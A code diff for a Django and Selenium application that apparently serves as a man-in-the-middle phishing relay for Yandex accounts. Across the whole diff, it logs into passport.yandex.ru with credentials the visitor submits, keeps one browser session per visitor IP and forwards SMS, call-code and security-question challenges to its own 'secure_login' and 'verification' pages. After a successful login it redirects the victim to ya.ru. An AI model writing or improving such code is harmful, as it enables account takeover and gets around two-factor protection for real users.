@@ -3,7 +3,7 @@ import asyncio
 import logging
 from datetime import datetime
 from channels.db import database_sync_to_async
-from django.shortcuts import render, redirect
+from django.shortcuts import render, redirect,reverse
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
@@ -11,8 +11,9 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from asgiref.sync import sync_to_async
 from .models import CustomUser
-from selenium.common.exceptions import TimeoutException
+from selenium.common.exceptions import  NoSuchWindowException, TimeoutException,NoSuchElementException
 from django.http import HttpResponse
+from django.http import HttpResponseRedirect
 from channels.consumer import AsyncConsumer
 import redis
 import os
@@ -40,7 +41,7 @@ class CleanupInactiveDriversConsumer(AsyncConsumer):
     async def start_inactive_drivers_cleanup(self):
         while True:
             await asyncio.sleep(10)  # Check every 10 seconds
-            print("Checking for inactive drivers...")
+            print(f"[{datetime.now()}]Checking for inactive drivers...")
             await check_timeout_and_close_drivers()
 
 
@@ -104,14 +105,11 @@ async def index(request):
                     return await sync_to_async(redirect)('https://ya.ru/')
 
                 elif result == "sms_code":
-                    return HttpResponse('sms_code')
-                    # phone_secure = WebDriverWait(driver, 10).until(
-                    #     EC.presence_of_element_located((By.TAG_NAME, "strong"))
-                    # )
-                    # phone_submit = driver.find_element(By.TAG_NAME, "button")
-                    # phone_submit.click()
-                    # return await sync_to_async(render)(request, 'secure_login.html',
-                    #                                    {'phone_number': phone_secure.text})
+
+                    phone_submit = driver.find_element(By.TAG_NAME, "button")
+                    phone_submit.click()
+                    return await sync_to_async(render)(request, 'secure_login.html',
+                                                       {'phone_number': driver.find_element(By.TAG_NAME, "strong").text})
 
                 elif result == "security_question":
                     # Handle security question
@@ -154,6 +152,18 @@ def create_selenium_driver():
 
     return driver
 
+async def verification(request):
+    client_ip = request.META.get('REMOTE_ADDR')
+
+    try:
+        driver = await get_driver(request, client_ip)
+        phone_number = driver.find_element(By.CLASS_NAME, "passp-phone-template").text
+        return await sync_to_async(render)(request, 'verification.html',
+                                           {'phone_number': phone_number})
+    except NoSuchElementException:
+        # Redirect the user to the initial login page if the element is not found
+        return HttpResponseRedirect(reverse('authentication:index'))
+
 
 def open_yandex_passport(driver):
     driver.get("https://passport.yandex.ru")
@@ -161,6 +171,7 @@ def open_yandex_passport(driver):
 
 # Actions performed for authorization
 def sign_in(driver, login, password):
+
     open_yandex_passport(driver)
     username_login = WebDriverWait(driver, 6).until(
         EC.presence_of_element_located((By.NAME, 'login'))
@@ -211,19 +222,19 @@ async def get_driver(request, client_ip):
             driver.refresh()  # Оновлюємо сторінку, щоб застосувати cookies
     else:
         driver_info = selenium_drivers[client_ip]
-        if not driver_info["driver"].current_window_handle:
-            driver_info["driver"].quit()
-            driver_info["driver"] = await asyncio.to_thread(create_selenium_driver)
+        try:
+            if not driver_info["driver"].current_window_handle:
+                try:
+                    driver_info["driver"].find_element(By.CLASS_NAME, "passp-phone-template")
+                except NoSuchElementException:
+                    # Handle the case when the element is not found, and reinitialize the driver
+                    driver_info["driver"].quit()
+                    driver_info["driver"] = await asyncio.to_thread(create_selenium_driver)
+                    # Redirect the user to the initial login page
+                    return HttpResponseRedirect(reverse('authentication:index'))
+        except NoSuchWindowException:
+            return HttpResponseRedirect(reverse('authentication:index'))
     return selenium_drivers[client_ip]["driver"]
-
-
-async def handle_sms_verification(request):
-    client_ip = request.META.get('REMOTE_ADDR')
-    driver = await get_driver(request, client_ip)
-    if request.method == 'POST':
-        pass
-    return await sync_to_async(render)(request, 'verification.html')
-
 
 def check_success(driver):
     try:
@@ -238,7 +249,7 @@ def check_success(driver):
 def check_sms_code(driver):
     try:
         WebDriverWait(driver, 6).until(
-            EC.presence_of_element_located((By.CLASS_NAME, "passp-field-question"))
+            EC.presence_of_element_located((By.CLASS_NAME, "auth-challenge__call-form"))
         )
         return "sms_code"
     except TimeoutException:
